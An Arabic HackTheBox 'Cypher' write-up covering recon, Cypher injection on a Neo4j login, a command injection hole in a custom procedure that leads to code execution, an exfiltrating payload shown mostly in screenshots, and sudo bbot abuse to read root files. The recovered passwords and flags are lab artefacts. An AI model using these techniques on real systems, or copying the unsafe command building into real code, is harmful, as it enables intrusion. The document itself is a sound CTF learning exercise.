+++
title = "HackTheBox | Cypher - عربي"
template = "page_rtl.html"
date = 2025-07-26
[taxonomies]
categories = ["CTF"]
tags = ["CTF", "HackTheBox", "HTB", "Challenge", "neo4j", "cypher", "bbot"]
+++

HackTheBox Cypher medium box write-up in Arabic - بالعربي.

<!-- more -->

## Recon

هنبدا بفحص المنافذ (Ports) باستخدام Nmap:

```
# Nmap 7.94SVN scan initiated Sat Mar  1 14:57:42 2025 as: nmap -sS -p- -sC -sV -Pn --min-rate 1000 -oN mainTCPScan 10.10.11.57
Warning: 10.10.11.57 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.57
Host is up (0.26s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar  1 15:00:03 2025 -- 1 IP address (1 host up) scanned in 141.56 seconds
```

هنضيف **cypher.htb** في ملف `/etc/hosts` عندنا:

لما فحصنا التطبيق اللي شغال على البورت 80، لقينا اسم التطبيق **GRAPH ASM**، وده يمكن يكون إشارة لينا (كنت فاكر انه GraphQL في البداية ولكن ملهوش اي علاقة بيه).

{{ image(src="/GraphASM.png", alt="graphasm", width=600) }}

هنختبر خاصية تسجيل الدخول (Login) مع فحص VHosts والمجلدات (Directory Bruteforcing).

{{ image(src="/GraphASMLogin.png", alt="graphasm login", width=600) }}

فحص `VHosts`:

```bash

ffuf -u "http://cypher.htb/" -H "Host: FUZZ.cypher.htb" -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt  --fs 154
```
الأمر بيستخدم أداة ffuf لفحص (subdomains) لـ cypher.htb بيستبدل كلمة FUZZ بقائمة من ملف seclists، وتصفية الردود بحجم 154 بايت (--fs 154) لأنها مبتكونش (subdomains) حقيقية False positive يعني.

فحص المجلدات (Directories):

```bash

dirsearch -u "http://cypher.htb/" --timeout=30
```

جربنا ندخل ببيانات زي `admin:admin` أو أي username و password مشهورين او Default لأنهم بيبقوا شغالين في بعض الأحيان, ومشغلين Burp Proxy في الخلفية.

عادةً، أنا بحب أدخل Single quote `(')` أو Backslash `(\)` في اي Login، سواء في CTF أو Bug Bounty، ودي بتبقى مفيدة جدًا في اكتشاف ثغرات زي الSQL Injection.

وجابت نتيجة في حالتنا:

```
HTTP/1.1 400 Bad Request
Server: nginx/1.24.0 (Ubuntu)
Date: Sun, 01 Mar 2025 20:28:00 GMT
Content-Length: 3440
Connection: keep-alive

Traceback (most recent call last):
  File "/app/app.py", line 142, in verify_creds
    results = run_cypher(cypher)
  File "/app/app.py", line 63, in run_cypher
    return [r.data() for r in session.run(cypher)]
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/session.py", line 314, in run
    self._auto_result._run(
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 221, in _run
    self._attach()
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 409, in _attach
    self._connection.fetch_message()
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 178, in inner
    func(*args, **kwargs)
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt.py", line 860, in fetch_message
    res = self._process_message(tag, fields)
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py", line 370, in _process_message
    response.on_failure(summary_metadata or {})
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 245, in on_failure
    raise Neo4jError.hydrate(**metadata)
neo4j.exceptions.CypherSyntaxError: {code: Neo.ClientError.Statement.SyntaxError} {message: Failed to parse string literal. The query must contain an even number of non-escaped quotes. (line 1, column 53 (offset: 52))
"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'nice\' return h.value as hash"
                                                     ^}

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/app.py", line 165, in login
    creds_valid = verify_creds(username, password)
  File "/app/app.py", line 151, in verify_creds
    raise ValueError(f"Invalid cypher query: {cypher}: {traceback.format_exc()}")
ValueError: Invalid cypher query: MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'nice\' return h.value as hash: Traceback (most recent call last):
  File "/app/app.py", line 142, in verify_creds
    results = run_cypher(cypher)
  File "/app/app.py", line 63, in run_cypher
    return [r.data() for r in session.run(cypher)]
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/session.py", line 314, in run
    self._auto_result._run(
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 221, in _run
    self._attach()
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 409, in _attach
    self._connection.fetch_message()
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 178, in inner
    func(*args, **kwargs)
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt.py", line 860, in fetch_message
    res = self._process_message(tag, fields)
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py", line 370, in _process_message
    response.on_failure(summary_metadata or {})
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 245, in on_failure
    raise Neo4jError.hydrate(**metadata)
neo4j.exceptions.CypherSyntaxError: {code: Neo.ClientError.Statement.SyntaxError} {message: Failed to parse string literal. The query must contain an even number of non-escaped quotes. (line 1, column 53 (offset: 52))
"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'nice\' return h.value as hash"
```

بعد شوية بحث، اكتشفنا إن دي مش SQL Injection عادية، لكنها **Cypher Injection**، ودي زي SQL بس لقواعد بيانات الـ Graph زي Neo4j.

[Cypher Injection CheatSheet](https://pentester.land/blog/cypher-injection-cheatsheet/)

لما رجعنا لنتايج الـ **dirsearch**:

```
[15:14:13] 200 -    5KB - /about                                            
[15:15:51] 307 -    0B  - /api  ->  /api/docs                               
[15:15:51] 307 -    0B  - /api/  ->  http://cypher.htb/api/api              
[15:16:50] 307 -    0B  - /demo  ->  /login                                 
[15:16:50] 307 -    0B  - /demo/  ->  http://cypher.htb/api/demo            
[15:17:58] 200 -    4KB - /login                                            
[15:17:59] 200 -    4KB - /login.html                                       
[15:19:25] 301 -  178B  - /testing  ->  http://cypher.htb/testing/          
                                                                             
Task Completed
```

المجلد **testing** شكله مهم، ولقينا ملف اسمه custom-apoc-extension-1.0-SNAPSHOT.jar`. عملناله decompilation باستخدام jd-gui ولقينا 2 classes:

`HelloWorldProcedure.class` - مش مهم.

`CustomFunctions.class` - مهم جدًا.

**CustomFunctions.class:**
```java

package com.cypher.neo4j.apoc;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;
import java.util.stream.Stream;
import org.neo4j.procedure.Description;
import org.neo4j.procedure.Mode;
import org.neo4j.procedure.Name;
import org.neo4j.procedure.Procedure;

public class CustomFunctions {
  @Procedure(name = "custom.getUrlStatusCode", mode = Mode.READ)
  @Description("Returns the HTTP status code for the given URL as a string")
  public Stream<StringOutput> getUrlStatusCode(@Name("url") String url) throws Exception {
    if (!url.toLowerCase().startsWith("http://") && !url.toLowerCase().startsWith("https://"))
      url = "https://" + url; 
    String[] command = { "/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url };
    System.out.println("Command: " + Arrays.toString((Object[])command));
    Process process = Runtime.getRuntime().exec(command);
    BufferedReader inputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
    BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
    StringBuilder errorOutput = new StringBuilder();
    String line;
    while ((line = errorReader.readLine()) != null)
      errorOutput.append(line).append("\n"); 
    String statusCode = inputReader.readLine();
    System.out.println("Status code: " + statusCode);
    boolean exited = process.waitFor(10L, TimeUnit.SECONDS);
    if (!exited) {
      process.destroyForcibly();
      statusCode = "0";
      System.err.println("Process timed out after 10 seconds");
    } else {
      int exitCode = process.exitValue();
      if (exitCode != 0) {
        statusCode = "0";
        System.err.println("Process exited with code " + exitCode);
      } 
    } 
    if (errorOutput.length() > 0)
      System.err.println("Error output:\n" + errorOutput.toString()); 
    return Stream.of(new StringOutput(statusCode));
  }
  
  public static class StringOutput {
    public String statusCode;
    
    public StringOutput(String statusCode) {
      this.statusCode = statusCode;
    }
  }
}
```

الclass الي اسمه `CustomFunctions` ده Procedure لـ Neo4j بيجيب الStatus code HTTP لـ URL معين عن طريق curl. لكن المشكلة إنه فيه ثغرة Command Injection خطيرة بسبب إن الإدخال مش متأمّن، وهنستغلها عن طريق Cypher Injection.

الكود المصاب:

```java

String[] command = { "/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url };
```

## Initial Foothold

كتبنا payload لـ Cypher Injection باستخدام الprocedure اللي لقيناه عشان ننفذ أوامر (Remote Code Execution).

{{ image(src="/CypheretcPasswd.png", alt="cypher etcpasswd", width=600) }}

الجزء الأول `(nice' RETURN h.value AS hash)` بيحاول يعمل Cypher Injection عن طريق كسر الquery الأصلية، و UNION بيضمن تنفيذ الجزء التاني، اللي بيستدعي الدالة المصابة بالثغرة `(custom.getUrlStatusCode)` مع URL معمول بحيث يكون فيه أمر `$(whoami)`، وده بينفذ أمر على السيرفر وبيبعت اسم المستخدم في الURL لـ 10.10.16.59.

وصللنا رد باسم المستخدم `neo4j` من الأمر whoami:

```
10.10.11.57 - - [01/Mar/2025 15:39:38] "GET /neo4j HTTP/1.1" 404 -
```

{{ image(src="/CypherWhoamiPayload.png", alt="cypher whoami", width=600) }}

جربنا نحقن Reverse Shell بشكل base64 عشان نجيب الـ `user.txt`:

{{ image(src="/ReverseShell.png", alt="reverse shell", width=600) }}

للأسف، مقدرناش نقرا الـ `user.txt` بالمستخدم `neo4j`، لكن لحسن الحظ لقينا كلمة السر للمستخدم `graphasm` في ملف اسمه `bbot_preset.yml`.

```bash

neo4j@cypher:/home/graphasm$ cat bbot_preset.yml 
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
neo4j@cypher:/home/graphasm$ su graphasm
Password: 
graphasm@cypher:~$ ls
bbot_preset.yml  user.txt
graphasm@cypher:~$ cat user.txt 
877410eb42c621eb6c4fbf3197244182
graphasm@cypher:~$
```

## Privilege Escalation

اول حاجة ببدأ بيها بعد ما اوصل لل `user flag (user.txt)` اني اشوف ايه الي اقدر اعمله بصلاحية الroot عن طريق الأمر `sudo -l`:

```bash

graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
graphasm@cypher:~$
```

> **BBOT (Basic Bug-hunting & OSINT Tool)** أداة مفتوحة المصدر لفحص الثغرات وجمع المعلومات (OSINT).
> بتساعد في أتمتة عمليات زي جمع النطاقات الفرعية (subdomains)، فحص المنافذ (Ports)، والزحف على الويب (Web Crawling)، وبتستخدم مصادر بيانات متعددة.
> 🔗 [GitHub: blacklanternsecurity/bbot](https://github.com/blacklanternsecurity/bbot)

لازم نلاقي طريقة نقرا بيها الـ `root.txt` flag من خلال `bbot`، فلاقينا طريقة نقدر نحقق بيها ده وده الأمر النهائي: `graphasm@cypher:~$ sudo /usr/local/bin/bbot -cy /root/root.txt -d --dry-run`.

```bash

sudo /usr/local/bin/bbot -cy /root/root.txt -d --dry-run
```

**شرح الأمر:**
**`sudo`** → بيشغل BBOT بصلاحيات **root**.  
**`/usr/local/bin/bbot`** → المسار الكامل لأداة **BBOT**.  
**`-cy /root/root.txt`**  
  `-c` → بيحدد ملف إعدادات مخصص (Configuration file).  
  `-y` →  بينفذ الأمر علي طول من غير تأكيد مني.  
  `/root/root.txt` → ملف فيه الـ flag اللي عايزين نقراه.
**`-d`** → بيشغل وضع **debug** عشان نشوف التفاصيل.  
**`--dry-run`** → بيشغل محاكاة من غير تغييرات فعلية، مفيد للاختبار كأنه بيورينا هو هيعمل ايه من غير ما ينفذه.

```bash

graphasm@cypher:~$ sudo /usr/local/bin/bbot -cy /root/root.txt -d --dry-run
  ______  _____   ____ _______
 |  ___ \|  __ \ / __ \__   __|
 | |___) | |__) | |  | | | |
 |  ___ <|  __ <| |  | | | |
 | |___) | |__) | |__| | | |
 |______/|_____/ \____/  |_|
 BIGHUGE BLS OSINT TOOL v2.1.0.4939rc

www.blacklanternsecurity.com/bbot

[DBUG] Preset bbot_cli_main: Adding module "stdout" of type "output"
[DBUG] Preset bbot_cli_main: Adding module "csv" of type "output"
[DBUG] Preset bbot_cli_main: Adding module "txt" of type "output"
[DBUG] Preset bbot_cli_main: Adding module "python" of type "output"
[DBUG] Preset bbot_cli_main: Adding module "json" of type "output"
[DBUG] Preset bbot_cli_main: Adding module "aggregate" of type "internal"
[DBUG] Preset bbot_cli_main: Adding module "dnsresolve" of type "internal"
[DBUG] Preset bbot_cli_main: Adding module "cloudcheck" of type "internal"
[DBUG] Preset bbot_cli_main: Adding module "excavate" of type "internal"
[DBUG] Preset bbot_cli_main: Adding module "speculate" of type "internal"
[VERB] 
[VERB] ### MODULES ENABLED ###
[VERB] 
[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
[VERB] | Module     | Type     | Needs API Key   | Description                   | Flags         | Consumed Events      | Produced Events    |
[VERB] +============+==========+=================+===============================+===============+======================+====================+
[VERB] | csv        | output   | No              | Output to CSV                 |               | *                    |                    |
[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
[VERB] | json       | output   | No              | Output to Newline-Delimited   |               | *                    |                    |
[VERB] |            |          |                 | JSON (NDJSON)                 |               |                      |                    |
[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
[VERB] | python     | output   | No              | Output via Python API         |               | *                    |                    |
[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
[VERB] | stdout     | output   | No              | Output to text                |               | *                    |                    |
[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
[VERB] | txt        | output   | No              | Output to text                |               | *                    |                    |
[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
[VERB] | cloudcheck | internal | No              | Tag events by cloud provider, |               | *                    |                    |
[VERB] |            |          |                 | identify cloud resources like |               |                      |                    |
[VERB] |            |          |                 | storage buckets               |               |                      |                    |
[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
[VERB] | dnsresolve | internal | No              |                               |               | *                    |                    |
[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
[VERB] | aggregate  | internal | No              | Summarize statistics at the   | passive, safe |                      |                    |
[VERB] |            |          |                 | end of a scan                 |               |                      |                    |
[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
[VERB] | excavate   | internal | No              | Passively extract juicy       | passive       | HTTP_RESPONSE,       | URL_UNVERIFIED,    |
[VERB] |            |          |                 | tidbits from scan data        |               | RAW_TEXT             | WEB_PARAMETER      |
[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
[VERB] | speculate  | internal | No              | Derive certain event types    | passive       | AZURE_TENANT,        | DNS_NAME, FINDING, |
[VERB] |            |          |                 | from others by common sense   |               | DNS_NAME,            | IP_ADDRESS,        |
[VERB] |            |          |                 |                               |               | DNS_NAME_UNRESOLVED, | OPEN_TCP_PORT,     |
[VERB] |            |          |                 |                               |               | HTTP_RESPONSE,       | ORG_STUB           |
[VERB] |            |          |                 |                               |               | IP_ADDRESS,          |                    |
[VERB] |            |          |                 |                               |               | IP_RANGE, SOCIAL,    |                    |
[VERB] |            |          |                 |                               |               | STORAGE_BUCKET, URL, |                    |
[VERB] |            |          |                 |                               |               | URL_UNVERIFIED,      |                    |
[VERB] |            |          |                 |                               |               | USERNAME             |                    |
[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
[VERB] Loading word cloud from /root/.bbot/scans/overmedicated_cheryl/wordcloud.tsv
[DBUG] Failed to load word cloud from /root/.bbot/scans/overmedicated_cheryl/wordcloud.tsv: [Errno 2] No such file or directory: '/root/.bbot/scans/overmedicated_cheryl/wordcloud.tsv'
[INFO] Scan with 0 modules seeded with 0 targets (0 in whitelist)
[WARN] No scan modules to load
[DBUG] Installing stdout - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "stdout"
[DBUG] Installing csv - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "csv"
[DBUG] Installing aggregate - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "aggregate"
[DBUG] Installing cloudcheck - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "cloudcheck"
[DBUG] Installing excavate - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "excavate"
[DBUG] Installing txt - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "txt"
[DBUG] Installing python - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "python"
[DBUG] Installing json - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "json"
[DBUG] Installing dnsresolve - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "dnsresolve"
[DBUG] Installing speculate - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "speculate"
[VERB] Loading 0 scan modules: 
[VERB] Loading 5 internal modules: aggregate,cloudcheck,dnsresolve,excavate,speculate
[VERB] Loaded module "aggregate"
[VERB] Loaded module "cloudcheck"
[VERB] Loaded module "dnsresolve"
[VERB] Loaded module "excavate"
[VERB] Loaded module "speculate"
[INFO] Loaded 5/5 internal modules (aggregate,cloudcheck,dnsresolve,excavate,speculate)
[VERB] Loading 5 output modules: csv,json,python,stdout,txt
[VERB] Loaded module "csv"
[VERB] Loaded module "json"
[VERB] Loaded module "python"
[VERB] Loaded module "stdout"
[VERB] Loaded module "txt"
[INFO] Loaded 5/5 output modules, (csv,json,python,stdout,txt)
[VERB] Setting up modules
[DBUG] _scan_ingress: Setting up module _scan_ingress
[DBUG] _scan_ingress: Finished setting up module _scan_ingress
[DBUG] dnsresolve: Setting up module dnsresolve
[DBUG] dnsresolve: Finished setting up module dnsresolve
[DBUG] aggregate: Setting up module aggregate
[DBUG] aggregate: Finished setting up module aggregate
[DBUG] cloudcheck: Setting up module cloudcheck
[DBUG] cloudcheck: Finished setting up module cloudcheck
[DBUG] internal.excavate: Setting up module excavate
[DBUG] internal.excavate: Including Submodule CSPExtractor
[DBUG] internal.excavate: Including Submodule EmailExtractor
[DBUG] internal.excavate: Including Submodule ErrorExtractor
[DBUG] internal.excavate: Including Submodule FunctionalityExtractor
[DBUG] internal.excavate: Including Submodule HostnameExtractor
[DBUG] internal.excavate: Including Submodule JWTExtractor
[DBUG] internal.excavate: Including Submodule NonHttpSchemeExtractor
[DBUG] internal.excavate: Including Submodule ParameterExtractor
[DBUG] internal.excavate: Parameter Extraction disabled because no modules consume WEB_PARAMETER events
[DBUG] internal.excavate: Including Submodule SerializationExtractor
[DBUG] internal.excavate: Including Submodule URLExtractor
[DBUG] internal.excavate: Successfully loaded custom yara rules file [/root/root.txt]
[DBUG] internal.excavate: Final combined yara rule contents: cc035683329642ce27f1de7dd4981a48

[DBUG] output.csv: Setting up module csv
[DBUG] output.csv: Finished setting up module csv
[DBUG] output.json: Setting up module json
[DBUG] output.json: Finished setting up module json
[DBUG] output.python: Setting up module python
[DBUG] output.python: Finished setting up module python
[DBUG] output.stdout: Setting up module stdout
[DBUG] output.stdout: Finished setting up module stdout
[DBUG] output.txt: Setting up module txt
[DBUG] output.txt: Finished setting up module txt
[DBUG] internal.speculate: Setting up module speculate
[INFO] internal.speculate: No portscanner enabled. Assuming open ports: 80, 443
[DBUG] internal.speculate: Finished setting up module speculate
[DBUG] _scan_egress: Setting up module _scan_egress
[DBUG] _scan_egress: Finished setting up module _scan_egress
[DBUG] Setup succeeded for cloudcheck (success)
[DBUG] Setup succeeded for _scan_egress (success)
[DBUG] Setup succeeded for json (success)
[DBUG] Setup succeeded for aggregate (success)
[DBUG] Setup succeeded for txt (success)
[DBUG] Setup succeeded for python (success)
[DBUG] Setup succeeded for _scan_ingress (success)
[DBUG] Setup succeeded for dnsresolve (success)
[DBUG] Setup succeeded for speculate (success)
[DBUG] Setup succeeded for csv (success)
[DBUG] Setup succeeded for stdout (success)
[INFO] internal.excavate: Compiling 10 YARA rules
[DBUG] internal.excavate: Finished setting up module excavate
[DBUG] Setup succeeded for excavate (success)
[DBUG] Setting intercept module dnsresolve._incoming_event_queue to previous intercept module _scan_ingress.outgoing_event_queue
[DBUG] Setting intercept module cloudcheck._incoming_event_queue to previous intercept module dnsresolve.outgoing_event_queue
[DBUG] Setting intercept module _scan_egress._incoming_event_queue to previous intercept module cloudcheck.outgoing_event_queue
[SUCC] Setup succeeded for 12/12 modules.
[DBUG] No words to save
graphasm@cypher:~$ 
```

الـ flag النهائي:
```

[DBUG] internal.excavate: Successfully loaded custom yara rules file [/root/root.txt]
[DBUG] internal.excavate: Final combined yara rule contents: cc035683329642ce27f1de7dd4981a48
```

## Conclusion

اتمني تكون استفدت حاجة زي ما أنا استفدت من الـmachine دي!

[بروفايلي علي HackTheBox](https://app.hackthebox.com/profile/2060398)

[Keybase](https://keybase.io/makyavelli)

[X](https://x.com/MachIaVellill)

<!-- تجربة فاشلة -->